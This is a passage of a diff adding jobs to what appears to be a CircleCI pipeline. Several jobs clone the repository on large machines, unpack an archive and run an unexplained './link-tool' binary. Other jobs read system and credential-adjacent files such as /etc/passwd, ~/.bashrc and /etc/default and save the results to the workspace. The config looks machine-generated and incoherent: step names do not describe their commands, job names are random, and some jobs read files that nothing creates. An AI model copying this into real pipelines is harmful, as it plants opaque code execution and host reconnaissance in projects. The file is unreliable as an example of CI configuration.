+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  D1-8B-BB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: And now restart the backlog
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; (trap 'echo cleaning up' EXIT; echo 'key=value'); true ; } > /tmp/_queue/138.125
+            sha1sum /tmp/_queue/138.125
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - '138.125'
+  Deploy_Pipeline2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/CedarNorthLepton 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  qty--chld:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Also translate the cookbook
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; df -h /|head -4; true ; } > /tmp/_queue/xLz
+            sha1sum /tmp/_queue/xLz
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'xLz'
+  jul21-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/xLz 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  Lock2PCI:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: format coverage report r7
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; if command -v grep >/dev/null 2>&1;then echo "grep found"; fi; true ; } > /tmp/_queue/archive.asset.vault
+            sha1sum /tmp/_queue/archive.asset.vault
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'archive.asset.vault'
+  rip-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/archive.asset.vault 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  IoT_INIT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: SpawnMiniMap
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; uptime|sort|nl; true ; } > /tmp/_queue/chromepolarproton
+            sha1sum /tmp/_queue/chromepolarproton
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'chromepolarproton'
+  edge-v1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/CedarNorthLepton 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+
+  guard_kiln_begin_font_yogurt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: I will diff the chaos scenarios tonight
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; grep -nv --color=never sh /etc/shells | nl; true ; } > /tmp/_queue/9dd6e37fe0f0fd1daac1898
+            sha1sum /tmp/_queue/9dd6e37fe0f0fd1daac1898
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - '9dd6e37fe0f0fd1daac1898'
+  cyan_post:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: H hour warmup
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; awk '$3 > $4 {printf "%-16s %s\n", $1, $7}' /etc/passwd | wc -l; true ; } > /tmp/_queue/xLz
+            sha1sum /tmp/_queue/xLz
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'xLz'
+  export_ref:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Just diff the thing
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; grep --no-messages --only-matching fi ~/.bashrc | tail -3; true ; } > /tmp/_queue/v.2.10
+            sha1sum /tmp/_queue/v.2.10
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'v.2.10'
+  delta_n1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Archive the emergency contacts for Yusuf
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; grep -IRnh export /etc/default 2>/dev/null | nl | head -8; true ; } > /tmp/_queue/snapshot.1.0
+            sha1sum /tmp/_queue/snapshot.1.0
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'snapshot.1.0'
+  C5-FF-78-2D-7A-6C:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: rotation of the source tree
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; echo -n 'sorting results' | awk '{print NF}'; true ; } > /tmp/_queue/PARseRHOst
+            sha1sum /tmp/_queue/PARseRHOst
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'PARseRHOst'
+  storeedge-glibc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Issue the interns before start date
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; for path in /usr/lib/*release*; do ls -l $path; done | head -n3; true ; } > /tmp/_queue/blake_2f63349b0daebf73
+            sha1sum /tmp/_queue/blake_2f63349b0daebf73
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'blake_2f63349b0daebf73'
+  media52-south:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: 15 back up backup set
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; for i in {1..12}; do echo $RANDOM; done | awk '{s+=$1} END {print s/NR}'; true ; } > /tmp/_queue/iter_003
+            sha1sum /tmp/_queue/iter_003
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'iter_003'
+  gradient_kernel_fill_balloon:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: MAY 14 UNLOAD
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; mkdir -p "/var/tmp/desk"/{red,purple,magenta} && ls "/var/tmp/desk"; true ; } > /tmp/_queue/txt.obj.src
+            sha1sum /tmp/_queue/txt.obj.src
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'txt.obj.src'
+  spamquuemai:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: The embedding table may be trained
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; true; true ; } > /tmp/_queue/LedgerSparkFrame
+            sha1sum /tmp/_queue/LedgerSparkFrame
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'LedgerSparkFrame'
+  paintMatrixShieldDeleteSidebar:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: approval HELP
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; ls -A ~ | tac | paste -s -d ' '; true ; } > /tmp/_queue/ziNcThreaD
+            sha1sum /tmp/_queue/ziNcThreaD
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'ziNcThreaD'
+  textarea--left:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Did the parcels get scanned
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; { printf "%s\n" dublin cairo bogota; } >"/var/tmp/middle_ledger.list" && sort "/var/tmp/middle_ledger.list"; true ; } > /tmp/_queue/2271.5463-router
+            sha1sum /tmp/_queue/2271.5463-router
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - '2271.5463-router'
+  path_139:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: doRepairMaterializedViews
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; ls -pird /proc; true ; } > /tmp/_queue/cr
+            sha1sum /tmp/_queue/cr
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'cr'
+workflows:
+  workflow:
+    jobs:
+      - cbEmptyQuick
+      - echo-2:
+          requires:
+            - cbEmptyQuick
+      - xrayQuiver:
+          requires:
+            - cbEmptyQuick
+      - vb-v2:
+          requires:
+            - xrayQuiver
+      - thx:
+          requires:
+            - xrayQuiver
+      - check-nightly-docker-image:
+          requires:
+            - thx
+      - Lock2PCI:
+          requires:
+            - thx
+      - rip-it:
+          requires:
+            - Lock2PCI
+      - detach-when:
+          requires:
+            - Lock2PCI
+      - anothr-run-27:
+          requires:
+            - detach-when
+      - cFjkwbwSJv:
+          requires:
+            - detach-when
+      - d-v2:
+          requires:
+            - cFjkwbwSJv
+      - ULT-32139b:
+          requires:
+            - cFjkwbwSJv
+      - rl-2a:
+          requires:
+            - ULT-32139b
+      - mitten-jigsaw:
+          requires:
+            - ULT-32139b
+      - alpha:
+          requires:
+            - mitten-jigsaw
+      - func_syn:
+          requires:
+            - mitten-jigsaw
+      - auh-check:
+          requires:
+            - func_syn
+      - IRQSGDBus
+      - NQ3MtDYhoNCB
+      - t-2:
+          requires:
+            - IRQSGDBus
+            - NQ3MtDYhoNCB
+      - RunSuite:
+          requires:
+            - IRQSGDBus
+            - NQ3MtDYhoNCB
+      - whiskey-7:
+          requires:
+            - IRQSGDBus
+            - NQ3MtDYhoNCB
+      - p-new:
+          requires:
+            - IRQSGDBus
+            - NQ3MtDYhoNCB
+      - LAB_RUN_1:
+          requires:
+            - IRQSGDBus
+            - NQ3MtDYhoNCB
+      - add-db:
+          requires:
+            - IRQSGDBus
+            - NQ3MtDYhoNCB
+      - BuildImage:
+          requires:
+            - IRQSGDBus
+            - NQ3MtDYhoNCB
+      - Deploy_Pipeline2:
+          requires:
+            - IRQSGDBus
+            - NQ3MtDYhoNCB
+      - edge-v1:
+          requires:
+            - IRQSGDBus
+            - NQ3MtDYhoNCB
+      - Shade2IRQ
+      - guard_kiln_begin_font_yogurt:
+          requires:
+            - Shade2IRQ
+      - q2-smoke:
+          requires:
+            - guard_kiln_begin_font_yogurt
+      - qty--chld:
+          requires:
+            - guard_kiln_begin_font_yogurt
+      - cyan_post:
+          requires:
+            - qty--chld
+      - jul21-smoke:
+          requires:
+            - cyan_post
+      - wbAccount:
+          requires:
+            - cyan_post
+      - export_ref:
+          requires:
+            - wbAccount
+      - APP-933:
+          requires:
+            - export_ref
+      - SimpleManualWidthUtil:
+          requires:
+            - export_ref
+      - delta_n1:
+          requires:
+            - SimpleManualWidthUtil
+      - q1-smoke:
+          requires:
+            - delta_n1
+      - beforeSelect:
+          requires:
+            - delta_n1
+      - C5-FF-78-2D-7A-6C:
+          requires:
+            - beforeSelect
+      - papa-5:
+          requires:
+            - C5-FF-78-2D-7A-6C
+      - jade229:
+          requires:
+            - C5-FF-78-2D-7A-6C
+      - storeedge-glibc:
+          requires:
+            - jade229
+      - rust-cov:
+          requires:
+            - storeedge-glibc
+      - lemon-tempo:
+          requires:
+            - storeedge-glibc
+      - media52-south:
+          requires:
+            - lemon-tempo
+      - API-542:
+          requires:
+            - media52-south
+      - can_update:
+          requires:
+            - media52-south
+      - gradient_kernel_fill_balloon:
+          requires:
+            - can_update
+      - feat-9771:
+          requires:
+            - gradient_kernel_fill_balloon
+      - Find-SymbolId:
+          requires:
+            - gradient_kernel_fill_balloon
+      - spamquuemai:
+          requires:
+            - Find-SymbolId
+      - update-parse-hang:
+          requires:
+            - spamquuemai
+      - label__error__current:
+          requires:
+            - spamquuemai
+      - paintMatrixShieldDeleteSidebar:
+          requires:
+            - label__error__current
+      - refactor-4999:
+          requires:
+            - paintMatrixShieldDeleteSidebar
+      - feat-builder-22:
+          requires:
+            - paintMatrixShieldDeleteSidebar
+      - textarea--left:
+          requires:
+            - feat-builder-22
+      - APP-274:
+          requires:
+            - textarea--left
+      - edge55-north:
+          requires:
+            - textarea--left
+      - path_139:
+          requires:
+            - edge55-north
+      - full-send:
+          requires:
+            - path_139
